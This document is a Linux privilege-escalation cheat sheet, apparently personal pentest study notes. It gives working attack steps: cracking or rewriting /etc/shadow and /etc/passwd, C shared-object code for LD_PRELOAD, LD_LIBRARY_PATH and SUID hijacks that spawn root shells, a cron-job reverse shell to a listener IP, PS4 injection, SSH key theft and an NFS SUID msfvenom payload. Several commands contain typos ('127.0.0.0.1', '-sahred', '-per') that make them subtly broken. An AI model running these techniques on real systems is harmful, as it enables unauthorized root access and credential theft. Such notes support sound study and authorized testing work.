## Strategy 

> https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst

1. check your user ID (`id`, `whoami`)
	- look around for files in user's home directory and other common locations (e.g. /var/backup, /var/logs)
	- look for history files and config files 
2. run Linux Smart Enumeration (`lse.sh`) with increasing levels 
	- read over results and make a note of each significant finding to try 
	- create a checklist of things you need for a privilege escalation method to work
	- run LinEnum, LinPEAS, etc. as well
	- if scripts fail you, run manual commands or use Linux PrivEsc cheatsheets online (i.e. [from g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/))
3. try privilege escalation methods that don't have many steps first (e.g. Sudo, Cron Jobs, SUID files)
4. next, look for root processes, enumerate their versions and search for exploits
5. then, check for internal ports you might be able to forward to you attacking machine 
6. re-read full enumeration dumps and highlight anything that seems odd
	- i.e. process or a filename you're unfamiliar with, an unusual filesystem (on Linux anything that isn't ext, swap, tmpfs), unusual usernames
7. look for kernel exploits 
8. don't give up


--- 
--- 

<br>

# Techniques

<br>

### -> Kernel Exploits:

1. enumerate kernel version: `uname -a`
2. find matching exploits (Google, ExploitDB, GitHub, `searchsploit`)
	- i.e. `linux-exploit-suggester-2.pl -k <kernel>`
3. Compile and run 

--- 

### -> Service Exploits:

1. enumerate processes running as root: `ps aux | grep "^root"`
2. identify version number of service:
	- `<program> --version `
	- `<program> -v`
	- on Debian systems: `dpkg -l | grep <program>`
	- on rpm systems: `rpm -qa | grep <program>`
3. find matching exploit 

<br>

#### -> Port Forwarding:

- a root process may be bound to an internal port, through which it communicates
- if for some reason, an exploit cannot be run locally on the target machine, the port can be forwarded using SSH to you local machine:
	- `ssh -R <local-port>:127.0.0.1:<service-port> <username>@<local-machine>`
- the exploit code can now be run on your local machine at whichever port you chose 

<br>

1. find service running locally (on 127.0.0.1): `netstat -nl`
2. use SSH port forwarding to access service:
	- i.e. `ssh -R 4444:127.0.0.0.1:3306 root@192.168.3.2`
3. connect to that service through local machine:
	- i.e. `mysql -u root -h 127.0.0.1 -P 4444`

--- 

### -> Weak File Permissions

Check permissions of **/etc/shadow** file: `ls -l /etc/shadow`
- if readable: 
	- extract root users hash: `head -n 1 /etc/shadow`
	- copy hash into "hash.txt"
	- crack the hash: `john --format=sha512crypt --wordlist=<wordlist>`
	- login to root user: `su root` -> [password]
- if writeable:
	- create a backup of the file: `cp /etc/shadow /etc/shadow.bak`
	- on local machine generate a new sha512 hash for a known password: `mkpasswd -m sha-512 <password>`
	- on target: replace root users password hash with the one generated in the /etc/shadow file 
	- login to root user: `su root` -> [password]
	- restore original shadow file when done: `cp /etc/shadow.bak /etc/shadow`

Check permissions of **/etc/passwd** file: `ls -l /etc/passwd`
- if writeable - option 1:
	- on local machine generate a new hash for a known password: `openssl passwd <password>`
	- copy the password hash generated to the target machine's /etc/passwd file, replacing the "x" for the root user
	- login to root user: `su root` -> [password]
- if writeable - option 2:
	- append a new row to the /etc/passwd file and create a new root user (UID must be set to 0)
	- login to root user: `su root` -> [password]
	
Check permissions on backup files:
- explore the filesystem looking for readable backup files, common places include; user home directories, the root directory, /tmp, and /var/backups
- check for readable permissions on the "~/.ssh" directory:
	- if readable key check if SSH key logins are allowed (in the /etc/ssh/sshd_config file)
	- copy the key to the local machine
	- give it the correct permissions: `chmod 600 root_key`
	- use the key to SSH into the target machine: `ssh -i root_key root@192.186.22.4`

--- 

### -> Sudo

1. check sudo permissions of current user: `sudo -l`
	- if you can use sudo unrestricted and know the user's password, spawn a root shell with: `sudo su`, or run; `sudo -s`, `sudo -i`, `sudo /bin/bash`, `sudo passwd` (to change the root user's password)
2. if restricted to certain programs, check if you can perform a shell escape by looking up the programs on https://gtfobins.github.io
3. if no escape sequence, try to abuse it's intended functionality:
	- if it can read files as root, you can extract passwords, hashes, keys, etc.
	- if you can write to files as root, you can insert or modify information 
	- i.e. the apache2 program errors and prints this to the screen if it cannot parse a configuration file -- this can be used to get the root user's password hash: `sudo apache2 -f /etc/shadow`, then copy the hash for cracking offlinthene

<br>

#### -> LD_PRELOAD

- **LD_PRELOAD** is an environment variable which can be set to the path of a shared object (.so) file 
- when set, the shared object will be loaded before any others
- by creating a custom shared object and creating an `init()` function, you can execute code as soon as the object is loaded 
- limitations:
	- LD_PRELOAD will not work if the real user ID is different from the effective user ID
	- sudo must be configured to preserve the LD_PRELOAD environment variable using the `env_keep` option

<br>

1. list the sudo permissions the current user has: `sudo -l`
2. check if the `env_keep` option includes the LD_PRELOAD environment variable
	- i.e. `env_keep+=LD_PRELOAD`
3. create a preload.c file with the contents:
	```c
	#include <stdio.h>
	#include <sys/types.h>
	#include <stdlib.h>

	void _init() {
		unsetenv("LD_PRELOAD");
		setresuid(0,0,0);
		system("/bin/bash -p");
	}
	```
4. compile the code in the /tmp directory: 
	- i.e. `gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c`
5. load any program using sudo and set the LD_PRELOAD environment variable to the full path of the shared object file just created to get a root shell:
	- i.e. `sudo LD_PRELOAD=/tmp/preload.so <program>`
	
<br>

#### -> LD_LIBRARY_PATH

- the LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are searched for first
- the `ldd` command can be used to print the shared libraries used by a program (i.e. `ldd /usr/sbin/apache2`)
- by creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load your shared library instead

<br>

1. list the sudo permissions the current user has: `sudo -l`
2. check if the `env_keep` option includes the LD_LIBRARY_PATH environment variable
	- i.e. `env_keep+=LD_LIBRARY_PATH`
3. run `ldd` command against a program listed:
	- i.e. `ldd /usr/sbin/apache2`
4. select a shared library to replace
5. create a file called "library_path.c" which includes the contents:
	```c
	#include <stdio.h>
	#include <stdlib.h>

	static void hijack() __attribute__((constructor));

	void hijack() {
		unsetenv("LD_LIBRARY_PATH");
		setresuid(0,0,0);
		system("/bin/bash -p");
	}
	```
6. compile the program just created into a shared object with the same name as the one you selected to replace:
	- i.e. `gcc -o libcrypt.so.1 -sahred -fPIC library_path.c`
7. run the sudo program selected and set the LD_LIBRARY_PATH environment variable to the current directory (where you compiled your replacement shared object), to get a root shell:
	- i.e. `sudo LD_LIBRARY_PATH=. apache2`

---

### -> Cron Jobs

File permissions:
> you can overwrite scripts set to be run as root in a cron job if they are writeable

1. check crontab for files configured to run as root: `cat /etc/crontab`
2. find the file configured to run:
	- i.e. `locate overwrite.sh`
3. check the permissions on this file
	- i.e. `ls -l /usr/local/bin/overwrite.sh`
4. if writeable, you can edit the file to create a reverse shell which will be run as root:
	```bash
	#!/bin/bash

	bash -i >& /dev/tcp/192.168.3.2/53 0>&1
	```
	- connects to local machine 192.168.3.2 on port 53
5. switch to local machine, setup a listener, and wait for cron job to execute 

<br>

Path environment variable:
> you can overwrite the PATH variable in the crontab file and if a cron job/script does not use an absolute path (and one of the PATH directories is writeable by the user) you may be able to create a program/script with the same name as the cron job

1. check the crontab PATH: `cat /etc/crontab`
2. check if the current user can write to a directory in this PATH
3. check if there are any cron jobs that don't use an absolute file path
	- i.e. `overwrite.sh` rather than `/usr/bin/overwrite.sh`
4. create a file with the same name as the cron job in the writeable directory so that it is executed rather than the original -- have it create an SUID version of bash:
	```bash
	#!/bin/bash

	cp /bin/bash /tmp/rootbash
	chmod +s /tmp/rootbash
	```
5. make replacement file executable (`chmod +x <filename>`) and wait for cron job to execute
6. then execute "rootbash" to get a root bash shell

<br>

Wildcards:
> it is possible to pass command line options (e.g. -h, --help) to command by creating files with these names. These can be more complex options (i.e. --option=key=value) and GTFO Bins can be used to help determine whether a command has command line options which will be useful for privilege escalation.

1. find scripts/command executed as root (i.e. in the crontab or SUID/SGID) which you can read
2. view the contents of this script to see if it executes commands which utilize wildcards
3. lookup the command run on GTFO Bins to see if their is a way to escalate privileges using this command and it's command line options (i.e. the tar command)

---

### -> SUID/SGID Files

1. find files with SUID/SGID bits set:
	- `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
2. lookup files found on the GTFO Bins website to see if they can be exploited or check for exploits on Google/ExploitDB/GitHub (similar to service exploits)
	- e.g. exim is known for being exploitable (i.e. `searchsploit exim 4.84`)
	- if a exploit has the "^M: bad interpreter" error when executed, then it was probably compile in Windows and you need to remove these characters to run it (i.e. `sed -i -e "s/^M//" <filename>` -- to get a ^M use: \<Ctrl\> - v + m)

<br>

Shared object injection:
> programs will load shared objects when executed. You can use the `strace` command to track these system calls and determine whether any shared objects were found. If you can write to the location the program tries to open, you can create a shared object and spawn a root shell when it is loaded.

1. find files with SUID/SGID bits set:
	- `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
2. use `strace` to see what happens when you execute and interesting file:
	- i.e. `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`
	- search for "open", "access", "no such file" in binary
3. look for files which the program calls but fails to open, or files which are called a writeable directory by the user
4. create the file the program calls, with the contents:
	```c
	#include <stdio.h>
	#include <stdlib.h>

	static void inject() __attribute__((constructor));
	void inject() {
		setuid(0);
		system("/bin/bash -p");
	}
	```
5. compile the file into a shared library file in the directory where the program looks for file:
	- i.e. `gcc -shared -fPIC -o libcalc.so libcalc.c`
6. execute the SUID/SGID program to gain a root shell
	- i.e. `/usr/local/bin/suid-so`

<br>

PATH environment variable:
> the PATH is used to search for files a program calls, if the program does not use its full (absoulte path). Since a user has full control over their PATH variable, you can tell the shell to first look for programs in a directory you can write to 

1. find files with SUID/SGID bits set:
	- `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
2. run the program through `strings`, `strace`, or `ltrace` to find embedded calls to other programs:
	- `strings <filename>`
	- `strace -v -f -e execve <command> 2>&1 | grep exec`
	- `ltrace <command>`
3. check if any embedded calls do not use absolute paths
4. create a file with the same name as the embedded call file, with the contents:
	```c
	int main() {
		setuid(0);
		system("/bin/bash -p");
	}
	```
5. compile the program:
	- i.e. `gcc -o service service.c`
6. prepend a writeable directory to the begin of your PATH variable and execute SUID/SGID program: 
	- i.e. `PATH=.:$PATH /usr/local/bin/suid-env`

<br>

Abusing shell features #1:
> some shells (notably Bash < 4.2-048) let you define user functions with an absolute path name. These functions can be exported so that subprocesses have access to them, and the function can take precedence over the acutal executable being called.

1. find files with SUID/SGID bits set:
	- `find / -type f -a \( -perm -u+s -o -per -g+s \) -exec ls -l {} \; 2> /dev/null`
2. run the program through `strings`, `strace`, or `ltrace` to find embedded calls to other programs
3. if an absolute PATH is used to call files, check the version of the shell being used:
	- i.e. `/bin/sh --version` or `/bin/bash --version`
4. if Bash < 4.2-048 is being used, create a bash function to take precedence over the embedded call in the SUID/SGID program:
	- i.e. `function /usr/sbin/service { /bin/bash -p; }`
5. export the function
	- i.e. `export -f /usr/sbin/service`
6. execute the SUID/SGID program, which in turn executes your function and will spawn a root shell
	- i.e. `/usr/local/bin/suid-env2`

<br>

Abusing shell features #2:
> Bash has a debugging mode which can be enabled with the `-x` options or by modifying the SHELLOPTS environment variable to include "xtrace". By default, SHELLOPTS is read only, but it can be set with the `env` command. In debugging mode Bash uses the environment variable PS4 to display an extra prompt for debugging statements and this variable can include an embedded command which will execute everytime it is shown. If a SUID file runs another program via Bash (e.g. by using `system()`) these environment variables can be inherited and it will execute with the privileges of the file owner. In Bash versions 4.4+, the PS4 environment variable is not inherited by shells running as root 

1. find files with SUID/SGID bits set:
	- `find / -type f -a \( -perm -u+s -o -per -g+s \) -exec ls -l {} \; 2> /dev/null`
2. run the program through `strings`, `strace`, or `ltrace` to find embedded calls to other programs
3. if an absolute PATH is used to call files, check the version of the shell being used:
	- i.e. `/bin/sh --version` or `/bin/bash --version`
4.  if Bash < 4.4 being used, it will inherit the PS4 environment variable when running as root which is used to display the prompt when Bash's debugging mode is being used 
5.  execute the vulnerable SUID/SGID program in a modified Bash debugging environment and use command line expansion (globbing) to creat a root shell:
	- i.e. `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash)' /usr/local/bin/suid-env2`
6. execute the newly create root bash shell: `/tmp/rootbash -p`

--- 

### -> Passwords & Keys

> password re-use and weak password storage are the easiest way to escalate privileges. The root user's password is hashed and stored securely in /etc/shadow, but other passwords (e.g. service passwords) may be stored in plaintext in config files and these may be re-used by the root user. Hence, always try to switch to the root user whenever you discover a new password.

History files:
> history files record commands issued by users while they are using certain programs and if a user types a password as part of a command, this password may be stored in a history file  

1. find history files by issuing `ls -a` in a user's home directory
2. cat the contents of these files to see if any passwords have been stored 
3. try to switch to the root user: `su root` -> [password]

<br>

Config files:
> services/programs use configuration (config) files to store settings, and if a service needs to authenticate it may store the credentials in a config file. If these config files are accessible, and the passwords they store are re-used by privileged users, you may be able to log in as that user 

1. find config files by issuing `ls -a` in a user's home directory, searching in the ~/.config directory, or looking in the /etc directory
2. cat the contents of these files to see if any authentication details have been stored 
3. try to switch to the root user: `su root` -> [password]

<br>

SSH keys:
> if a user has stored their private SSH key insecurely, anyone who can read the key may be able to log into their account using it

1. check for readable permissions on the "~/.ssh" directory
2. if readable key, check if SSH key logins are allowed (in the /etc/ssh/sshd_config file)
3. copy the key to the local machine and give it the correct permissions: `chmod 600 root_key`
4. use the key to SSH into the target machine: `ssh -i root_key root@192.186.22.4`

---

### -> NFS 

> NFS (Network File System) is a popular distributed file system and NFS shares are configured in the /etc/exports file. Remote users can mount shares, access, create, and modify files, and by default files created inheir the remote user's ID and group ID, even if they don't exist on the NFS server. To prevent an obvious privilege esclation NFS uses Root Squashing, where if the remote user is (or claims to be) root (uid=0) then NFS will "squash" the user and treat them as if they are the "nobody" user in the "nogroup" group. While this behaviour is default, it can be disabled by configuring the NFS option "no_root_squash" and, when included in a writeable share configuration, this means a remote user who identifies as "root" can create files on the NFS share as the local root user.

1. check if the NFS share is configured with the "no_root_squash" option: `cat /etc/exports`
2. enumerate NFS on the target machine to ensure you can mount a share:
	- to show the NFS server's export list: `showmount -e <target>` (or in nmap `nmap -sV --script=nfs-showmount <target>`)
	- to mount an NFS share: `mount -o rw,vers=2 <target>:<share> <local_directory>`
3. create a mount point on local machine to use for NFS share, and then mount the NFS share:
	- i.e. `mkdir /tmp/nfs` -> `mount -o rw,vers=2 192.168.1.24:/tmp /tmp/nfs`
4. create a payload to run which generates a root shell and save it to the NFS share:
	- i.e. `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
	- this must be done as the root user so the UID is inherited 
5. make the payload executable and set the SUID bit: 
	- i.e. `chmod +xs /tmp/nfs/shell.elf`
6. confirm the file has been created with the correct permissions:
	- i.e. `ls -l /tmp`
7. execute the file to get a root shell: 
	- i.e. `./shell.elf`
	


	
